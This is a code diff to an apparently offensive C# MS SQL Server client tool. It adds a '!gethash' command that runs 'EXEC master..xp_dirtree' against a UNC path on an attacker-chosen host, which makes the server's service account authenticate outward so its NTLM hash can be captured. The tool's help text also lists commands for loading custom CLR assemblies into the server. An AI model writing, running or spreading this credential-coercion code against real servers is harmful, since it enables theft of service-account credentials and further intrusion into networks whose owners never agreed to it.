@@ -80,6 +80,20 @@ namespace SQLL
 
 			return true;
         }
+
+		static void GetHash(String hashCmd, SqlConnection passedCon)
+        {
+			String[] cmdSplit = hashCmd.Split(' ');
+			if(cmdSplit.Length != 2)
+            {
+				Console.WriteLine("You didn't provide a hostname or ip address to connect to!");
+				return;
+            }
+
+			String addr = cmdSplit[1];
+			String getHashCmd = "EXEC master..xp_dirtree \"\\\\" + addr + "\\\\test\"";
+			RunSql(getHashCmd, passedCon);
+        }
 		static void Main(string[] args)
 		{
 
@@ -132,6 +146,7 @@ namespace SQLL
                     {
 						Console.WriteLine("!assembly C:\\my\\library.dll");
 						Console.WriteLine("!deleteAssembly assemblyName procedureName");
+						Console.WriteLine("!gethash *ip or domain*");
 						continue;
                     }
                     if (cmd.ToLower().StartsWith("!assembly"))
@@ -155,6 +170,10 @@ namespace SQLL
 						RemoveAssembly(cmd, con);
 						continue;
                     }
+					if (cmd.ToLower().StartsWith("!gethash")) {
+						GetHash(cmd, con);
+						continue;
+					}
 
                     try
                     {
